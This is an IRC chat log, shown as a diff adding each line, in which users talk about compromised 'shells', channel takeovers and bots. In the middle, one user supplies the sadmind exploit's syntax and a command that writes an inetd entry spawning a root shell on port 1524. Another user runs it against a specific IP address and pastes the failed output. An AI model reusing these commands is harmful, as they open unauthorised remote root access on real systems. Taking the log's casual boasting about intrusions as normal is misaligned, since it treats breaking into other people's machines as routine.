@@ -1,0 +1,141 @@
+:m4ry :YO
+:m4ry :HEY
+:m4ry :WAKE UP MORONS
+:D1ck :ACTION is away: (Auto-Away after 15 mins) [BX-MsgLog On]
+:D1ck :.add D1ck * D1ck 100 1 4
+:D1ck :.save
+:_pen :whats goin on?
+:D1ck :nadda
+:D1ck :bored
+:_pen :em too
+:_pen :i got my first legit shell
+:D1ck :haha
+:D1ck :cool
+:D1ck :how much did u pay?
+:_pen :nothing
+:D1ck :.add D1ck * D1ck 100 1 4
+:_pen :heh
+:D1ck :.save
+:D1ck :where had u bee/.
+:D1ck :u hang in #amdx?
+:_pen :no
+:_pen :they are being gay
+:D1ck :cool
+:D1ck :hehe
+:_pen :grid is mad cuz im friends with someone he hates
+:_pen :therefor im not aloud in there
+:D1ck :hahaha
+:D1ck :grid's gay'
+:D1ck :U HANG WITH DIZASYA
+:D1ck :DIZSTA
+:D1ck :HEH
+:D1ck :i`ve hacked 30+ of his shells
+:D1ck :he doesnt even know hwo to secure it
+:D1ck :or secure a subnet
+:D1ck :tons locally
+:D1ck :_pen 
+:D1ck :dont hand over the key to any one 
+:D1ck :ok?
+:_pen :ok
+:D1ck :_pen: who gave u the key, btw?
+:D1ck :m4ry??
+:_pen :*** D1ck has joined #lecole
+:_pen :<D1ck> j #k1dd13 neat22
+:D1ck :oh
+:_pen :)
+:D1ck :h3h
+:_pen :=)
+:D1ck ::)
+:D1ck :ok
+:D1ck :what in the world are u doing in #deathaces?
+:D1ck :heh
+:_pen :what is it?
+:D1ck :a channel for fun
+:_pen :i just did a whois
+:_pen :and saw someone in there
+:_pen :and joined
+:D1ck :heh kl
+:_pen :a channel for fun == ?
+:D1ck :welp
+:D1ck :hey hang in for chatting etc
+:D1ck ::)
+:_pen :k
+:D1ck ::)
+:_pen :hey
+:_pen :do u have the syntax
+:_pen :for
+:D1ck :yeah
+:_pen :sadmind exploit
+:_pen :?
+:D1ck :lol
+:D1ck :yes
+:_pen :what is it
+:D1ck :./sparc -h hostname -c command -s sp [-o offset] [-a alignment] [-p]
+:_pen : what do i do for -c
+:D1ck :heh
+:D1ck :u dont know?
+:_pen :no
+:D1ck :"echo 'ingreslock stream tcp nowait root /bin/sh sh -i' >> /tmp/bob ; /usr/sbin/inetd -s /tmp/bob"
+:D1ck :that would open 1524
+:_pen :%sp 0x00000000 offset 688 --> return address 0x000002b0
+:_pen :[4]
+:_pen :%sp 0x00000000 with frame length 4808 --> %fp 0x000012c8
+:_pen :exploit failed; RPC succeeded and returned { 2, 343, "[1,1,1]   
+:_pen : 
+:_pen :" } 
+:D1ck :c==command
+:_pen :wtf
+:_pen :it seg faulted
+:_pen :./sadmindex-sparc -h 203.252.173.250 -c "echo 'ingreslock stream tcp nowait root /bin/sh sh -i' >> /tmp/bob ; /usr/sbin/inetd -s /tmp/bob"
+:_pen :thats what i did
+:_pen :heelo?
+:D1ck :[Lag ??] 
+:D1ck :what did u ask
+:D1ck :repeat again
+:D1ck :i got d/c
+:_pen :./sadmindex-sparc -h 203.252.173.250 -c "echo 'ingreslock stream tcp nowait root /bin/sh sh -i' >> /tmp/bob ; /usr/sbin/inetd -s /tmp/bob"
+:_pen :thats what i did
+:_pen :and it seg faulted
+:D1ck :dunno
+:D1ck :brb
+:Insekt :thanks
+:D1ck :yep
+:D1ck :np
+:D1ck :mechnet
+:Insekt :nice
+:Insekt :it was in #flem for a little while right?
+:Insekt :or some of them
+:Insekt :even
+:D1ck :?
+:insekt` :?
+:insekt` :what?
+:D1ck :hehe
+:insekt` :flem lost ops again
+:insekt` :heh
+:D1ck :shit
+:D1ck :heh
+:D1ck :i`ll fuck all of them
+:insekt` :it happens like every week
+:D1ck :to regain
+:D1ck :i offfered them bots
+:D1ck :but no no
+:D1ck :dont listen to me
+:insekt` :heh
+:D1ck :heh
+:insekt` :its always a good chan though
+:D1ck :yep
+:insekt` :with or without ops
+:D1ck :;P
+:insekt` :heh
+:D1ck :;p
+:insekt` :so, whats been going on?
+:insekt` :hah
+:insekt` :am join chan #enforcers
+:D1ck :heh
+:insekt` :elite
+:insekt` :dammit
+:insekt` :heh
+:D1ck :ACTION is away: (SLEEP) [BX-MsgLog On]
+:D1ck :cya
+:D1ck :gave to sleep
+:insekt` :see ya
